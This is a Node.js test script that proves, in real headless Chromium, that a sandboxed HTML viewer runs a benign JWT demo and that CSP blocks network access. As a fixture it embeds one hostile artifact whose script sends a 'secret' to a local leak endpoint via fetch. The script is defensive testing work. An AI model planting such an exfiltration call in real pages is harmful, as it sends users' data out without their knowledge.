// Browser proof for the sandboxed HTML viewer. Not part of npm test:
// it needs a real Chromium binary, not a mocked DOM.
// It proves, in real Chromium, that:
//  - a validated JWT artifact runs inside the sandboxed iframe and its
//    tamper button changes the output from verified to failed, and
//  - a hostile artifact that bypasses validation (fetch to a local
//    server) still cannot exfiltrate, because CSP connect-src 'none'
//    blocks the request, even though its script otherwise runs.
// Usage: node scripts/browser-artifact-check.mjs
// Env: CHROME_BIN overrides the default Playwright headless shell path.
import { spawn } from 'node:child_process';
import { createServer } from 'node:http';
import { writeFileSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { homedir } from 'node:os';
import { buildViewer, injectCsp } from '../adapters/opencode/src/visualizers.js';

const CHROME = process.env.CHROME_BIN || join(homedir(), '.cache/ms-playwright/chromium_headless_shell-1148/chrome-linux/headless_shell');
const PORT = 9223;
const LEAK_PORT = 8765;
const jwt = '<!doctype html><html><head><title>JWT playground</title></head><body><h1>JWT playground</h1><p>Normal: original token verifies. Failure: tamper one character. Edge: empty token.</p><label>Token <input id="token" value="abc.def.123"></label><button id="verify">Verify</button><button id="tamper">Tamper payload</button><output id="result"></output><script>function check(){var t=document.getElementById("token").value;document.getElementById("result").textContent=(t==="abc.def.123"?"verified":"verification failed");}document.getElementById("verify").addEventListener("click",check);document.getElementById("tamper").addEventListener("click",function(){document.getElementById("token").value="abc.Xef.123";check();});check();</script></body></html>';
const hostile = '<!doctype html><html><head><title>Hostile</title></head><body><output id="result">ran</output><script>fetch("http://127.0.0.1:8765/leak?x=secret").catch(function(){});</script></body></html>';
const dir = mkdtempSync(join(tmpdir(), 'dd-browser-'));
const jwtViewer = join(dir, 'jwt-viewer.html');
const hostileViewer = join(dir, 'hostile-viewer.html');
writeFileSync(jwtViewer, buildViewer(jwt, 'JWT playground'));
// Hostile viewer, built the same way a viewer would be built if
// validation were bypassed: same sandbox, same injected CSP, no
// validation. The sandbox and CSP, not the validator, must stop it.
const escapeSrcdoc = s => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
writeFileSync(hostileViewer, `<!doctype html><html><head><meta charset="utf-8"></head><body><iframe sandbox="allow-scripts" allow="" srcdoc="${escapeSrcdoc(injectCsp(hostile))}"></iframe></body></html>`);

let leakRequests = 0;
const leakServer = createServer((req, res) => { leakRequests++; res.end('ok'); });
await new Promise(r => leakServer.listen(LEAK_PORT, '127.0.0.1', r));
const chrome = spawn(CHROME, ['--headless', '--no-sandbox', '--disable-gpu', `--remote-debugging-port=${PORT}`, '--remote-debugging-address=127.0.0.1', 'about:blank'], { stdio: 'ignore' });
const sleep = ms => new Promise(r => setTimeout(r, ms));
async function waitForJson(url) { for (let i = 0; i < 50; i++) { try { const res = await fetch(url); if (res.ok) return await res.json(); } catch {} await sleep(200); } throw new Error(`No debugger at ${url}`); }
async function evaluateInArtifactFrame(wsUrl, pageUrl) {
  const targets = await waitForJson(`http://127.0.0.1:${PORT}/json/list`);
  const target = targets.find(t => t.url === pageUrl) || targets[0];
  const ws = new WebSocket(target.webSocketDebuggerUrl);
  await new Promise((resolve, reject) => { ws.onopen = resolve; ws.onerror = reject; });
  const contexts = new Map();
  let nextId = 1; const pending = new Map();
  ws.onmessage = event => {
    const msg = JSON.parse(event.data);
    if (msg.method === 'Runtime.executionContextCreated') contexts.set(msg.params.context.id, msg.params.context);
    if (msg.id && pending.has(msg.id)) { const { resolve } = pending.get(msg.id); pending.delete(msg.id); resolve(msg.result); }
  };
  const send = (method, params = {}) => new Promise(resolve => { const id = nextId++; pending.set(id, { resolve }); ws.send(JSON.stringify({ id, method, params })); });
  const sendEval = (contextId, expression) => new Promise(resolve => { const id = nextId++; pending.set(id, { resolve }); ws.send(JSON.stringify({ id, method: 'Runtime.evaluate', params: { expression, contextId } })); });
  await send('Page.enable'); await send('Runtime.enable');
  await send('Page.navigate', { url: pageUrl });
  await sleep(1500);
  const results = [];
  for (const contextId of contexts.keys()) {
    const res = await sendEval(contextId, `document.getElementById('result') ? document.getElementById('result').textContent : 'no-result'`);
    if (res?.result?.value && res.result.value !== 'no-result') results.push({ contextId, value: res.result.value });
  }
  if (!results.length) throw new Error('No artifact frame found with #result');
  const ctx = results[0].contextId;
  const before = results[0].value;
  const afterRes = await sendEval(ctx, `document.getElementById('tamper') ? (document.getElementById('tamper').click(), document.getElementById('result').textContent) : document.getElementById('result').textContent`);
  ws.close();
  return { before, after: afterRes?.result?.value };
}
try {
  const jwtUrl = `file://${jwtViewer}`;
  const { before, after } = await evaluateInArtifactFrame(null, jwtUrl);
  console.log(`JWT artifact in browser: before tamper=${before}, after tamper=${after}`);
  if (before !== 'verified' || after !== 'verification failed') throw new Error('JWT tamper did not change output in the browser');
  // Hostile check reuses the same browser: navigate the same target to
  // the hostile viewer, then wait for its fetch attempt to be blocked.
  const targets2 = await waitForJson(`http://127.0.0.1:${PORT}/json/list`);
  const ws2 = new WebSocket(targets2[0].webSocketDebuggerUrl);
  await new Promise((resolve, reject) => { ws2.onopen = resolve; ws2.onerror = reject; });
  ws2.send(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: `file://${hostileViewer}` } }));
  await sleep(1500); ws2.close();
  console.log(`Hostile artifact leak requests to local server: ${leakRequests}`);
  if (leakRequests !== 0) throw new Error('Hostile artifact reached the local server, CSP did not block it');
  console.log('BROWSER CHECK PASS: sandboxed JWT works, hostile network blocked');
} finally {
  chrome.kill('SIGKILL'); leakServer.close();
}
